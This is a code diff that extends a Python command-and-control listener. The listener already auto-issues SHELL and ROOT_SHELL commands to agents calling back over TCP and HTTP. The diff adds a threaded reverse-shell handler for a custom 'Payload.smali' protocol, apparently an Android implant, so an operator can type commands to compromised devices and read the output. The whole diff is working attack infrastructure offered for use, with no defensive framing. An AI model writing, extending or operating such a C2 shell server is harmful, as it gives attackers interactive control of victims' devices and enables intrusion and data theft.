@@ -126,7 +126,7 @@ def _handle_tcp_client(conn: socket.socket, addr_tuple, auto_exploit: bool,
                 print(f"[*] Auto-exploit → {cmd}")
 
         if cmd:
-            payload = json.dumps({"cmd": cmd}).encode() + b"\n"
+            payload = json.dumps({"cmd": cmd}, separators=(',', ':')).encode() + b"\n"
             try:
                 conn.sendall(payload)
                 with _sessions_lock:
@@ -243,7 +243,7 @@ class _AgentHTTPHandler(BaseHTTPRequestHandler):
                 print(f"[*] Auto-exploit → {cmd}")
 
         if cmd:
-            resp_body = json.dumps({"cmd": cmd}).encode()
+            resp_body = json.dumps({"cmd": cmd}, separators=(',', ':')).encode()
             with _sessions_lock:
                 _sessions[addr]["cmd_history"].append(cmd)
         else:
@@ -375,6 +375,58 @@ def _repl(lhost: str, lport: int):
             print(f"  Unknown command: {line}. Type 'help'.")
 
 
+# ── Shell payload handler (custom Payload.smali protocol) ─────────────────────
+
+def _shell_handler(conn: socket.socket, addr: str):
+    print(f"\n[+] Shell callback from {addr}")
+    print(f"    Type commands. Output ends with '---END---'. Ctrl-C to disconnect.\n")
+    f = conn.makefile("rwb", buffering=0)
+    try:
+        while True:
+            try:
+                cmd = input(f"shell@{addr}> ").strip()
+            except (EOFError, KeyboardInterrupt):
+                print()
+                break
+            if not cmd:
+                continue
+            if cmd in ("exit", "quit"):
+                break
+            f.write((cmd + "\n").encode())
+            f.flush()
+            # Read until ---END---
+            while True:
+                line = f.readline()
+                if not line:
+                    print("[*] Connection closed by remote")
+                    return
+                line = line.decode("utf-8", errors="replace").rstrip("\n")
+                if line == "---END---":
+                    break
+                print(line)
+    finally:
+        conn.close()
+        print(f"[*] Shell session {addr} closed")
+
+
+def _shell_server(port: int):
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind(("0.0.0.0", port))
+    srv.listen(5)
+    print(f"[*] Shell handler listening on 0.0.0.0:{port}  (custom Payload protocol)")
+    while True:
+        try:
+            conn, addr_tuple = srv.accept()
+            addr = f"{addr_tuple[0]}:{addr_tuple[1]}"
+            t = threading.Thread(target=_shell_handler, args=(conn, addr), daemon=False)
+            t.start()
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            print(f"[-] Shell accept error: {e}")
+
+
 # ── Entry point ───────────────────────────────────────────────────────────────
 
 def main():
@@ -386,6 +438,7 @@ def main():
     ap.add_argument("--auto-exploit", action="store_true",   help="Auto-issue SHELL/ROOT_SHELL on callback")
     ap.add_argument("--no-http",    action="store_true",     help="Disable HTTP listener")
     ap.add_argument("--no-tcp",     action="store_true",     help="Disable TCP listener")
+    ap.add_argument("--shell-port", type=int, default=0,     help="Custom shell payload port (Payload.smali)")
     args = ap.parse_args()
 
     lhost = args.lhost
@@ -411,6 +464,10 @@ def main():
                               args=(args.http_port, args.auto_exploit, lhost, args.lport),
                               daemon=True)
         t2.start()
+
+    if args.shell_port:
+        t3 = threading.Thread(target=_shell_server, args=(args.shell_port,), daemon=True)
+        t3.start()
 
     _repl(lhost, args.lport)
 
